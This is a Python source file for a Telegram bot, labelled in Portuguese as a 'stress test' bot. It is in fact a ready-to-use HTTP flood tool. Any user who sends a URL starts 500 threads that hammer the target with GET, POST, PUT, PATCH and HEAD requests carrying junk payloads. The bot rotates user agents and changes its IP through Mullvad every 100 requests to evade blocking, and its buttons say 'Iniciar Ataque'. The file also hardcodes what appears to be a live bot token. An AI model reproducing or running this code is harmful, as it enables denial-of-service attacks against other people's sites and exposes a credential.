
import threading
import random
import requests
import subprocess
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from replit import db

TOKEN = "8061748013:AAHpn45TB5Z2QbkVC6o-WhqjyXg2R7-BRt8"

alvo = ""
ataque_ativo = False
threads = []
lock = threading.Lock()
contador = 0

rotas = ["/", "/login", "/admin", "/search", "/panel", "/api", "/dashboard", "/wp-admin", "/phpmyadmin", "/cpanel", "/config", "/backup", "/db", "/mysql", "/sql", "/users", "/upload", "/download", "/files", "/media", "/images", "/css", "/js", "/assets", "/public", "/private", "/secure", "/protected", "/system", "/core", "/lib", "/includes", "/modules", "/plugins", "/themes", "/templates", "/cache", "/tmp", "/logs", "/error", "/debug", "/test", "/dev", "/staging", "/beta"]
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Mozilla/5.0 (Linux; Android 10)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

def gerar_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

def obter_ip_atual():
    try:
        response = requests.get("https://ifconfig.me", timeout=5)
        return response.text.strip()
    except:
        return "Erro ao obter IP"

def trocar_ip_mullvad():
    try:
        # Lista os relays disponíveis
        result = subprocess.run(["mullvad", "relay", "list"], capture_output=True, text=True)
        if result.returncode == 0:
            linhas = result.stdout.strip().split('\n')
            relays = []
            for linha in linhas:
                palavras = linha.split()
                if len(palavras) > 0 and '-' in palavras[0]:
                    relays.append(palavras[0])
            
            if relays:
                relay_escolhido = random.choice(relays)
                subprocess.run(["mullvad", "relay", "set", "location", relay_escolhido], check=True)
                time.sleep(2)  # Aguarda a conexão
                return True
        return False
    except:
        return False

def disparar_requisicoes():
    global contador
    contador_local = 0
    while ataque_ativo:
        # Troca IP a cada 100 requisições
        if contador_local % 100 == 0 and contador_local > 0:
            if trocar_ip_mullvad():
                print(f"IP trocado para: {obter_ip_atual()}")
        
        for _ in range(25):
            try:
                rota = random.choice(rotas)
                url = alvo + rota + "?q=" + ''.join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(12))
                headers = gerar_headers()
                
                # Múltiplas requisições simultâneas
                requests.get(url, headers=headers, timeout=0.5)
                requests.post(url, headers=headers, data={"x": "A" * 1000, "y": "B" * 800, "z": "C" * 600}, timeout=0.5)
                requests.head(url, headers=headers, timeout=0.5)
                requests.put(url, headers=headers, data={"data": "X" * 1200}, timeout=0.5)
                requests.patch(url, headers=headers, data={"patch": "Y" * 900}, timeout=0.5)
                
                with lock:
                    contador += 5
                    contador_local += 5
                    print(f"Enviando req para {alvo} - IP: {obter_ip_atual()}", end="\r")
            except Exception as e:
                print(f"Erro na requisição: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    # Salva o user_id na base de dados
    if "users" not in db:
        db["users"] = []
    
    users = db["users"]
    if user_id not in users:
        users.append(user_id)
        db["users"] = users
    
    keyboard = [
        [InlineKeyboardButton("🚀 Iniciar Ataque", callback_data="iniciar")],
        [InlineKeyboardButton("❌ Cancelar Ataque", callback_data="cancelar")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    mensagem = f"""
🔥 **Bem-vindo ao Bot de Stress Test, {user_name}!** 🔥

⚡ **Comandos disponíveis:**
• `/start` - Menu principal
• `/info <url>` - Verifica status de um site
• `/ip` - Mostra seu IP atual
• `/trocarip` - Troca IP via Mullvad
• `/online` - Envia mensagem para todos usuários
• `/source` - Obtém arquivos do bot
• `/parar` - Para ataque ativo

🎯 **Escolha uma ação abaixo:**
    """
    
    await update.message.reply_text(mensagem, reply_markup=reply_markup, parse_mode='Markdown')

async def botao_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ataque_ativo
    query = update.callback_query
    await query.answer()
    if query.data == "iniciar":
        await query.edit_message_text("Envie a URL do alvo:")
    elif query.data == "cancelar":
        ataque_ativo = False
        await query.edit_message_text("Ataque cancelado.")

async def receber_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global alvo, ataque_ativo, threads, contador

    if ataque_ativo:
        return

    text = update.message.text.strip()
    if not text.startswith("http"):
        await update.message.reply_text("URL inválida.")
        return

    alvo = text
    ataque_ativo = True
    contador = 0
    threads = []

    for _ in range(500):
        t = threading.Thread(target=disparar_requisicoes)
        t.daemon = True
        t.start()
        threads.append(t)

    keyboard = [[InlineKeyboardButton("Cancelar ataque", callback_data="cancelar")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Ataque iniciado:\n{alvo}", reply_markup=reply_markup)

async def parar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ataque_ativo
    ataque_ativo = False
    await update.message.reply_text("Ataque parado.")

async def verificar_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ip_atual = obter_ip_atual()
    await update.message.reply_text(f"IP atual: {ip_atual}")

async def trocar_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Trocando IP...")
    if trocar_ip_mullvad():
        novo_ip = obter_ip_atual()
        await update.message.reply_text(f"IP trocado com sucesso!\nNovo IP: {novo_ip}")
    else:
        await update.message.reply_text("Erro ao trocar IP. Verifique se o Mullvad está configurado.")

async def info_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot_info = await context.bot.get_me()
    await update.message.reply_text(
        f"🤖 **Informações do Bot:**\n\n"
        f"📛 **Nome:** {bot_info.first_name}\n"
        f"👤 **Username:** @{bot_info.username}\n"
        f"🆔 **ID:** {bot_info.id}\n\n"
        f"💡 **Dica:** Use `/info <url>` para verificar status de sites",
        parse_mode='Markdown'
    )

async def enviar_online_para_todos(context: ContextTypes.DEFAULT_TYPE):
    if "users" in db:
        users = db["users"]
        for user_id in users:
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="🟢 Bot está ONLINE e pronto para uso!"
                )
            except Exception as e:
                print(f"Erro ao enviar mensagem para {user_id}: {e}")

async def online(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await enviar_online_para_todos(context)
    await update.message.reply_text("Mensagem de online enviada para todos os usuários!")

async def verificar_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ **Uso:** `/info <url>`\n\n**Exemplo:** `/info https://example.com`", parse_mode='Markdown')
        return
    
    url = context.args[0]
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    await update.message.reply_text(f"🔍 Verificando status de: `{url}`...", parse_mode='Markdown')
    
    try:
        start_time = time.time()
        response = requests.get(url, timeout=10, headers=gerar_headers())
        end_time = time.time()
        
        tempo_resposta = round((end_time - start_time) * 1000, 2)
        
        if response.status_code == 200:
            status_emoji = "🟢"
            status_text = "ONLINE"
        elif response.status_code >= 500:
            status_emoji = "🔴"
            status_text = "ERRO DO SERVIDOR"
        elif response.status_code >= 400:
            status_emoji = "🟡"
            status_text = "ERRO DO CLIENTE"
        else:
            status_emoji = "🔵"
            status_text = "RESPOSTA INCOMUM"
        
        mensagem = f"""
{status_emoji} **Status do Site**

🌐 **URL:** `{url}`
📊 **Status:** {status_text}
🔢 **Código:** {response.status_code}
⏱️ **Tempo:** {tempo_resposta}ms
📏 **Tamanho:** {len(response.content)} bytes
        """
        
    except requests.exceptions.Timeout:
        mensagem = f"""
🔴 **Site FORA DO AR ou LENTO**

🌐 **URL:** `{url}`
❌ **Erro:** Timeout (>10s)
💡 **Possível causa:** Site sobrecarregado ou offline
        """
        
    except requests.exceptions.ConnectionError:
        mensagem = f"""
🔴 **Site INACESSÍVEL**

🌐 **URL:** `{url}`
❌ **Erro:** Conexão recusada
💡 **Possível causa:** Site completamente offline
        """
        
    except Exception as e:
        mensagem = f"""
🔴 **Erro na Verificação**

🌐 **URL:** `{url}`
❌ **Erro:** {str(e)}
        """
    
    await update.message.reply_text(mensagem, parse_mode='Markdown')

async def enviar_source(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📁 **Enviando arquivos do bot...**", parse_mode='Markdown')
    
    # Lê e envia bot.py
    try:
        with open('bot.py', 'r', encoding='utf-8') as f:
            bot_content = f.read()
        
        from io import BytesIO
        bot_file = BytesIO(bot_content.encode('utf-8'))
        bot_file.name = 'bot.py'
        
        await update.message.reply_document(
            document=bot_file,
            caption='📄 **bot.py** - Versão básica do bot'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Erro ao enviar bot.py: {e}")
    
    # Lê e envia main.py sem token
    try:
        with open('main.py', 'r', encoding='utf-8') as f:
            main_content = f.read()
        
        # Remove o token
        main_content = main_content.replace(
            'TOKEN = "8061748013:AAHpn45TB5Z2QbkVC6o-WhqjyXg2R7-BRt8"',
            'TOKEN = "SEU_TOKEN_AQUI"'
        )
        
        from io import BytesIO
        main_file = BytesIO(main_content.encode('utf-8'))
        main_file.name = 'main.py'
        
        await update.message.reply_document(
            document=main_file,
            caption='📄 **main.py** - Arquivo principal (sem token)'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Erro ao enviar main.py: {e}")
    
    # Lê e envia requirements.txt
    try:
        with open('requirements.txt', 'r', encoding='utf-8') as f:
            req_content = f.read()
        
        from io import BytesIO
        req_file = BytesIO(req_content.encode('utf-8'))
        req_file.name = 'requirements.txt'
        
        await update.message.reply_document(
            document=req_file,
            caption='📄 **requirements.txt** - Dependências do projeto'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Erro ao enviar requirements.txt: {e}")
    
    # Criar e enviar um ZIP com todos os arquivos
    try:
        import zipfile
        from io import BytesIO
        
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Adicionar bot.py
            with open('bot.py', 'r', encoding='utf-8') as f:
                zip_file.writestr('bot.py', f.read())
            
            # Adicionar main.py sem token
            with open('main.py', 'r', encoding='utf-8') as f:
                main_content_zip = f.read()
                main_content_zip = main_content_zip.replace(
                    'TOKEN = "8061748013:AAHpn45TB5Z2QbkVC6o-WhqjyXg2R7-BRt8"',
                    'TOKEN = "SEU_TOKEN_AQUI"'
                )
                zip_file.writestr('main.py', main_content_zip)
            
            # Adicionar requirements.txt
            with open('requirements.txt', 'r', encoding='utf-8') as f:
                zip_file.writestr('requirements.txt', f.read())
        
        zip_buffer.seek(0)
        zip_buffer.name = 'telegram_bot_source.zip'
        
        await update.message.reply_document(
            document=zip_buffer,
            caption='📦 **telegram_bot_source.zip** - Todos os arquivos em um ZIP'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Erro ao criar ZIP: {e}")
    
    await update.message.reply_text("✅ **Todos os arquivos foram enviados!**", parse_mode='Markdown')

async def enviar_mensagem_inicial(app):
    if "users" in db:
        users = db["users"]
        for user_id in users:
            try:
                await app.bot.send_message(
                    chat_id=user_id,
                    text="🟢 Bot está ONLINE e pronto para uso!"
                )
            except Exception as e:
                print(f"Erro ao enviar mensagem para {user_id}: {e}")

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(botao_callback))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), receber_url))
    app.add_handler(CommandHandler("parar", parar))
    app.add_handler(CommandHandler("ip", verificar_ip))
    app.add_handler(CommandHandler("trocarip", trocar_ip))
    app.add_handler(CommandHandler("info", verificar_site))
    app.add_handler(CommandHandler("online", online))
    app.add_handler(CommandHandler("source", enviar_source))
    app.add_handler(CommandHandler("botinfo", info_bot))
    
    print("Bot iniciado...")
    
    # Envia mensagem inicial para usuários cadastrados
    async def enviar_inicial():
        if "users" in db:
            users = db["users"]
            for user_id in users:
                try:
                    await app.bot.send_message(
                        chat_id=user_id,
                        text="🟢 Bot está ONLINE e pronto para uso!"
                    )
                except Exception as e:
                    print(f"Erro ao enviar mensagem para {user_id}: {e}")
    
    # Executa o envio inicial em background
    import threading
    def thread_inicial():
        import asyncio
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            # Aguarda um pouco para o bot inicializar
            import time
            time.sleep(2)
            # Então tenta enviar as mensagens
            if "users" in db:
                users = db["users"]
                for user_id in users:
                    try:
                        import requests
                        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
                        data = {
                            "chat_id": user_id,
                            "text": "🟢 Bot está ONLINE e pronto para uso!"
                        }
                        requests.post(url, data=data)
                    except:
                        pass
        except:
            pass
    
    # Inicia thread em background
    threading.Thread(target=thread_inicial, daemon=True).start()
    
    print("Bot executando...")
    app.run_polling()
